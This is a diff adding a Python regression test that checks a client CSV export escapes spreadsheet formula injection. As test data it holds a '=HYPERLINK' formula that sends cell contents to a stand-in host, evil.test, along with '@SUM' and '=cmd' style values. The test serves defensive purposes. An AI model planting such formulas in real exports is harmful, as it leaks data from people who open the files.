@@ -438,3 +438,16 @@ def test_two_owners_deleting_each_other_leave_one_standing(root_client):
         assert len(passed) <= 1, f"прошли оба, система осталась бы без владельца: {codes}"
     finally:
         _restore_fixture_root(root_client, fixture_root_id, first, second)
+
+
+def test_formula_v_vygruzke_ne_vypolnyaetsya(manager_client):
+    """Разбор 28.09.2026: имя клиента приходит и с сайта, а `=HYPERLINK(...)` в ячейке CSV
+    Excel выполняет у того, кто открыл выгрузку. Суммы и телефоны при этом — числа, как были."""
+    from core.services.report_service import to_csv
+
+    lovushka = '=HYPERLINK("http://evil.test/?d="&A1,"Открыть")'
+    assert manager_client.post(f"{API}/clients", json={"name": lovushka, "phone": "+380 67 123 45 67"}).status_code == 201
+    tekst = manager_client.get(f"{API}/clients/export.csv").content.decode("utf-8-sig")
+    assert "'=HYPERLINK" in tekst and "\n=HYPERLINK" not in tekst and ';=HYPERLINK' not in tekst
+    stroka = to_csv([["@SUM(A1)", "-123,45", "+380 67 123 45 67", "\t=cmd", "обычный"]], ["a", "b", "c", "d", "e"])
+    assert stroka.decode("utf-8-sig").splitlines()[1] == "'@SUM(A1);-123,45;+380 67 123 45 67;'\t=cmd;обычный"
